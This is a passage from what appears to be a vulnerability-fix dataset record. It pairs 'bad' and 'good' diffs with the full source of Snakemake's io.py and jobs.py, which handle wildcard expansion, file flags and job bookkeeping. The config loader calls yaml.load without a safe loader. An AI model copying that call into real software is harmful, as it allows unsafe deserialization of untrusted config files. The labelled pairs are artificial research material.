latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"}, "/snakemake/jobs.py": {"changes": [{"diff": "\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n", "add": 1, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"], "goodparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]}, {"diff": "\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n", "add": 34, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["                    yield IOFile(f, self.rule)"], "goodparts": ["                    fileToYield = IOFile(f, self.rule)", "                    fileToYield.clone_flags(f_)", "                    yield fileToYield", "            else:", "                yield f", "    @property", "    def expanded_input(self):", "        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"", "        for f, f_ in zip(self.input, self.rule.input):", "            if not type(f_).__name__ == \"function\":", "                if type(f_.file).__name__ not in [\"str\", \"function\"]:", "                    if contains_wildcard(f_):", "                        expansion = self.expand_dynamic(", "                            f_,", "                            restriction=self.wildcards,", "                            omit_value=_IOFile.dynamic_fill)", "                        if not expansion:", "                            yield f_", "                        for f, _ in expansion:", "                            fileToYield = IOFile(f, self.rule)", "                            fileToYield.clone_flags(f_)", "                            yield fileToYield", "                    else:", "                        yield f", "                else:", "                    yield f"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = 